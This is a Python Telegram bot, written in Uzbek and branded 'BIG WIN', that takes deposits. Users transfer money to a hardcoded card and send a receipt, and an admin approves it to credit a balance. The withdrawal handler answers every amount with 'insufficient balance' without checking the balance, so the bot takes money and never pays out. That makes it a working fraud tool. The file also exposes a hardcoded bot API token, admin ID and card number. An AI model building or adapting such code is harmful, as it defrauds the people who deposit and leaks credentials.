from keep_alive import keep_alive
keep_alive()

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)

API_TOKEN = "6940986191:AAGZGcitp0REh85bT6n5CY79K3S5elh41JI"
ADMIN_ID = 5815294733
CARD_NUMBER = "9860 6067 5024 7151"

bot = Bot(token=API_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)

users = {}
pending = {}

# ================= KEYBOARDS =================

main_kb = ReplyKeyboardMarkup(resize_keyboard=True)
main_kb.add("💳 Hisob to‘ldirish", "💸 Mablag‘ chiqarish")
main_kb.add("📊 Balans")

paid_kb = ReplyKeyboardMarkup(resize_keyboard=True)
paid_kb.add("✅ To‘lov qildim")
paid_kb.add("⬅️ Ortga")

def admin_kb(user_id):
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"confirm:{user_id}"),
        InlineKeyboardButton("❌ Rad etish", callback_data=f"reject:{user_id}")
    )
    return kb

# ================= START =================

@dp.message_handler(commands=["start"])
async def start(msg: types.Message):
    users[msg.from_user.id] = {
        "balance": 0,
        "step": None
    }
    await msg.answer(
        "🎉 <b>Xush kelibsiz!</b>\n"
        "Siz <b>BIG WIN</b> botidasiz 🎰",
        reply_markup=main_kb
    )

# ================= HISOB TOLDIRISH =================

@dp.message_handler(text="💳 Hisob to‘ldirish")
async def deposit(msg: types.Message):
    users[msg.from_user.id]["step"] = "amount"
    await msg.answer("💰 Qancha pul kiritmoqchisiz?")

@dp.message_handler(lambda m: users.get(m.from_user.id, {}).get("step") == "amount")
async def get_amount(msg: types.Message):
    if not msg.text.isdigit():
        await msg.answer("❌ Faqat raqam kiriting")
        return

    users[msg.from_user.id]["amount"] = int(msg.text)
    users[msg.from_user.id]["step"] = "username"
    await msg.answer("🆔 O‘yin ichidagi ID yoki ismingizni yozing")

@dp.message_handler(lambda m: users.get(m.from_user.id, {}).get("step") == "username")
async def get_username(msg: types.Message):
    users[msg.from_user.id]["username"] = msg.text
    users[msg.from_user.id]["step"] = "waiting_payment"

    await msg.answer(
        f"✅ <b>Qabul qilindi</b>\n\n"
        f"💳 <b>Karta:</b>\n"
        f"<code>{CARD_NUMBER}</code>\n"
        f"👤 BIG WIN\n\n"
        f"Pulni o‘tkazib bo‘lgach tugmani bosing 👇",
        reply_markup=paid_kb
    )

# ================= TO‘LOV QILDIM =================

@dp.message_handler(text="✅ To‘lov qildim")
async def paid(msg: types.Message):
    users[msg.from_user.id]["step"] = "send_check"
    await msg.answer("📸 Iltimos, <b>CHEK RASMINI</b> yuboring")

# ================= CHEK QABUL =================

@dp.message_handler(content_types=types.ContentType.PHOTO)
async def get_check(msg: types.Message):
    if users.get(msg.from_user.id, {}).get("step") != "send_check":
        return

    pending[msg.from_user.id] = users[msg.from_user.id]

    await bot.send_photo(
        ADMIN_ID,
        msg.photo[-1].file_id,
        caption=(
            "💰 <b>YANGI TO‘LOV</b>\n\n"
            f"👤 User: @{msg.from_user.username}\n"
            f"🆔 ID: <code>{msg.from_user.id}</code>\n"
            f"💵 Summa: <b>{users[msg.from_user.id]['amount']} so‘m</b>\n"
            f"🎮 Ism: {users[msg.from_user.id]['username']}"
        ),
        reply_markup=admin_kb(msg.from_user.id)
    )

    await msg.answer("⏳ To‘lov tekshirilmoqda...")

# ================= ADMIN TASDIQ =================

@dp.callback_query_handler(lambda c: c.data.startswith(("confirm", "reject")))
async def admin_action(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.answer("Ruxsat yo‘q", show_alert=True)
        return

    action, user_id = call.data.split(":")
    user_id = int(user_id)

    if user_id not in pending:
        await call.answer("Topilmadi", show_alert=True)
        return

    if action == "confirm":
        users[user_id]["balance"] += pending[user_id]["amount"]
        await bot.send_message(user_id, "✅ Hisobingizga pul tushdi")
    else:
        await bot.send_message(user_id, "❌ To‘lov rad etildi")

    pending.pop(user_id)
    await call.answer("Bajarildi")

# ================= BALANS =================

@dp.message_handler(text="📊 Balans")
async def balance(msg: types.Message):
    await msg.answer(f"💰 Balansingiz: <b>{users[msg.from_user.id]['balance']} so‘m</b>")

# ================= MABLAG CHIQARISH =================

@dp.message_handler(text="💸 Mablag‘ chiqarish")
async def withdraw(msg: types.Message):
    await msg.answer("💸 Qancha pul yechmoqchisiz?")

@dp.message_handler(lambda m: m.text.isdigit())
async def deny_withdraw(msg: types.Message):
    await msg.answer("❌ Balansingizda yetarli mablag‘ yo‘q")

# ================= ORTGA =================

@dp.message_handler(text="⬅️ Ortga")
async def back(msg: types.Message):
    users[msg.from_user.id]["step"] = None
    await msg.answer("🏠 Asosiy menyu", reply_markup=main_kb)

# ================= ADMIN PANEL =================

@dp.message_handler(commands=["admin"])
async def admin_panel(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    await msg.answer(
        "🛠 <b>ADMIN PANEL</b>\n\n"
        "📢 Reklama\n"
        "💰 To‘lovlar\n"
        "👥 Foydalanuvchilar"
    )

# ================= RUN =================

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
